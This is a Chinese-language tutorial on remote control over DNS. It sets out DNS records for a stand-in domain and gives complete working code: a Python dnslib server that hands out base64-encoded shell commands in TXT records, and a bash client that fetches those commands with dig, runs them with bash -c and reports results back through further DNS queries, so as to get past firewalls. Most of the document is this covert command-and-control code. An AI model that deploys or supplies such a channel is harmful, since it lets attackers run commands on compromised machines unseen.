# 通过dns远程控制
### 原理
在内网防火墙阻碍了远控客户端与服务端直接通信的时候,可以借内网的dns服务器做中转.  
需要一台公网服务器`a.b.c.d`和一个域名`abc.xyz`,搭建dns服务,接收经过构造的域名字符串,比如`i-am-very-happy.abc.xyz`,等同于向服务器发送了一个内容为`i-am-very-happy`的字符串,服务器再返回一个构造的字符串,比如CNAME可以是`how-old-are-you.abc.xyz`,这里用TXT可以传递更多字符,这样就完成了一次通信.这种方式更加隐蔽,但承载的内容有限.
### 准备域名
| 记录类型 | 主机记录 | 记录值 |
| :-: | :-: | :-: |
| NS | x | ns.abc.xyz |
| A | ns | a.b.c.d |
### 服务端
```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-

import dnslib, os, re, time, base64
os.chdir(os.path.split(os.path.realpath(__file__))[0])


class just_a_resolver:
    def resolve(self, request, handler):
        domain = 'x.abc.xyz.'
        response = request.reply()
        name = str(request.q.qname)
        # 判断域名是否合法以及类型是否为TXT,不符合直接返回
        if request.q.qtype != 16 or not name.endswith(
                domain) or len(name) <= len(domain) + 1:
            return response
        try:
            # 机器id-会话id-返回值-毫秒时间戳
            # 123xxC-5873310-x-1525873329733
            userid, stamp, status, _ = name[:-(len(domain) + 1)].split('-')[:4]
            # userid不能用数字字母以外的其他字符
            if re.findall('[^a-zA-Z0-9]',
                          userid) or not os.path.exists(userid):
                raise Exception
            # 每次请求和返回都用同一个stamp,只能是7位数字
            if re.findall('[^0-9]', stamp) or len(stamp) != 7:
                raise Exception
        except:
            return response

        # status为执行完命令上传的执行结果,为一个数字
        if status.isdigit():
            for r, _, f in os.walk(userid):
                for fl in f:
                    if fl.endswith('_%s.cmd' % stamp):
                        path = os.path.join(r, fl.replace('.cmd', '.res'))
                        # 当存在某个还没有被回复的stamp文件时,以它命名,否则不写入
                        if not os.path.exists(path):
                            open(path, 'w').write(status)
                            return response
        else:
            # 遍历目录,找到第一个txt结尾的文件,发送其内容并重命名为: 秒级时间戳_stamp.cmd
            for r, _, f in os.walk(userid):
                for fl in f:
                    if fl.endswith('.txt'):
                        path = os.path.join(r, fl)
                        try:
                            c = base64.b64encode(
                                open(path).read().encode('utf-8')).decode(
                                    'utf-8')
                            os.rename(path,
                                      os.path.join(r, '%d_%s.cmd' %
                                                   (time.time() * 1000,
                                                    stamp)))
                        except:
                            return response
                        response.add_answer(
                            dnslib.RR.fromZone(
                                name + ' 60 IN TXT ' + ' '.join([
                                    '"%s"' % c[i:i + 255]
                                    for i in range(0, len(c), 255)
                                ]))[0])
                        return response

        return response


from dnslib.server import DNSServer
DNSServer(just_a_resolver(), port=53, address="0.0.0.0", tcp=False).start()
```
### 客户端
```bash
#!/bin/bash
userid='123xxC'
domain='x.abc.xyz'
timestamp=$(date +%s%N)
((timestamp=timestamp/1000000))
((sessionid=timestamp/100%10000000))

cmd=$(dig txt ${userid}-${sessionid}--${timestamp}.${domain} +short | tr -d ' "' | base64 -d)
bash -c "$cmd"
status=$?

timestamp=$(date +%s%N)
((timestamp=timestamp/1000000))
dig txt ${userid}-${sessionid}-${status}-${timestamp}.${domain}
```
客户端大概像这样,因为用得不多,就简单点了.
### 适用范围
根据网络环境不同,比如是否允许DNS的TCP模式,丢包率的高低等因素,每次请求承载的数据量也不同.在网络稳定,使用UDP,没有截断和重传的情况下,一次请求可以获得440个左右的字符,再加上使用了base64,最终可以获得有效字符为330个左右,对于简短的shell命令来说堪堪够用.  
如果需要稳定持久的连接,可以考虑使用DNS隧道,比如[iodine](https://github.com/yarrick/iodine)或[dnscat2](https://github.com/iagox86/dnscat2)